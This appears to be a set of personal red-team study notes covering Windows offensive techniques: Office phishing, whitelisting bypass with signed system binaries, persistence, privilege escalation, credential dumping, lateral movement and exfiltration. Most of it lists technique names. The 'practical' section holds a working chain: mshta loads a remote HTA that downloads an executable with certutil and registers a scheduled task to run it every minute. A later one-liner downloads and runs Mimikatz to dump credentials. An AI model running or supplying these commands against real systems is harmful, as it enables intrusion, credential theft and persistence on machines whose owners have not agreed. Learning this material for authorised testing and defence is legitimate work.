## Various way of execution

1. Execution via hyperlink
2. Execution via .URL
3. Execution via saving .XML
4. using .rtf
5. using include picture


## phishing with MS ofice

1. Phishing DDE
2. XLM
3. office macros
4. OLE LNK
5. Embedded Internet Explorer
6. .SLK Excel
7. Inject Macros from a remote DOtm template
8. Embedded HTMl forms objects

## spraying outlook web access

1. password.  waf? 
l0phtrack, hydra

ired team password spraying using web outlook. 


## bypassing application whitelisting to run

1. Regsvr32 code execution - for execution of dll. calling using default services.

2.  MSHTA Code execution

3. Control panel item code execution

4. CMSTP code execution

5. InstallUtil code execution

7. pubprn.vbs signed signed script code execution

## Code execution when something is blocked

1. rundll32.exe PowerShdll.dll, main - for running powershell when powershell is disabled.

powersploit.

2. SyncAppvPublishing Server - this can be used to run powershell commands to do code injection. payload should be signed. how to make microsoft signed. 

3. Whitelisting bypass using WMIC and XSL
wmic os get /FORMAT:'evil.xsl"

4. forfiles indirect command execution - 
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe

5. building Msbuild to build binary in target system

Msbuild.exe C:\bad\bad.xml

6. code execution through control panel add ins 
forcing explorer.exe to load your DLL that is compiled as a control panel item adn registered as a control panel add in

7. executing control panel item thorugh an exported cplappler function

dll is compiled and made into .cpl

## Persistence

1. DLLs through using persistence
2. schtask - code execution, privilege escalation, lateral movement and persistence.
3. Service execution, privilege escalation.
4. window logon helper
5. hijacking default file extension
6. Persisting in svchost.exe with a serviec dll
7. modifying .lnk shortcuts
8. screensaver hijack
9. using bitsadmin
10. COM hijacking - component object model -  like activeX
11. Powershell profile persistance
12. word library add ins
13. Office templatesadd ins

# practical 
1. initial access
2. code execution

these are done through LOLBIN


## creating a lnk shortcut file that has reference to target directory

```
DAY-1
ipconfig
python -m http.server 8000
C:\Windows\System32\mshta.exe https://crank.gq/lab/1.hta 
<html>
<head>
<script language="jscript">
        var e = "cmd /c certutil -urlcache -split -f https://crank.gq/lab/1.exe c:/windows/tasks/1.exe";
        new ActiveXObject('WScript.Shell').Run(e,0,true);
        var y= 'schtasks /create /sc minute /mo 1 /tn "InitialAccess" /tr C:\\Windows\\Tasks\\1.exe';
        new ActiveXObject('WScript.Shell').Run(y,0,true);

</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```

## privilege escalation

1. unquoted service path - changing the program loading order

2. Environment variable path interception - looking at writeable path in $PATH

3. image file execution options inject -

setting cmd.exe as notepad.exe debugger so that when notepad.exe is executed it will actually start cmd.exe

4. DLL search order hijacking

5. Primary access token manipulation - creating a new process with a token stolen from another process

remember how services uses user token to run. so they copy the token.

7zip exploit running command with cmd

fodhelper.exe in UAC bypass

6. Pass the hash -  privilege escalation with invoke- WMIExec 

if we have an NTLM v2 hash of a local administrator is available then it is possible to pass the has and execute code with privileges of that local administratoe

7. Weak service permissions - 

if low privileged user can overrite binary service

## Credential access and dumping

1.  Dumping credentials with Mimikatz

`powershell IEX (New-Object Sytem.Net.webClient).DownloadString('http://mimikatz.ps1'); Invoke-Mimikatz --Dumpcreds`

it can also be done with mindump

2. Dumping hashes from SAM via Registry

we get the samdumpt then in kali we can use samdump2 system sam
samdump get the ntlm hashes

3. We can dump SAM via esentutl.exe

4. Credentials in Registry 

we can serach through `reg query HKLM /f password /t REG_SZ /s`

5. we can also dump caches and cookies, neosoft mpass view > browser dump


## Enumeration and Discovery

1. looking at sysmon

2.  WIndows events

3. COM to enumerate hostanme username doman network drives

4. Windows event id

## lateral movement

1. WMI for lateral movement - we can use it to run at a user in the same network with its credential

2. WMI + MSI for Lateral Movement - net use ?

## Efilteration

1. via web and email - 

github, pastebin, Discord and youtube ( saved as video), 

2. via malware

3. via protocol abuse - dns tunneling 
`https://github.com/omkartotade/Data-Exfilteration`

4. File types - change file types to hide your tracks so that you can send data.

we can use deeply nested zip.

5. file obfuscation techniques. 

- base64 encode
- HTTP
- PS
- Bitstransfer
- HTTP server
- ftp server - [pyftplib] to start ftp
- Netcat

## Hardware toolkit

including LAN tapp and hack5 rubber ducky, usb logger.
LAN turtle - get network enumeration

pineapple nano - for wifi ssid clone, rogue access point

LAN tap
RFID thief - cloner

mosse instiute - for red teaming







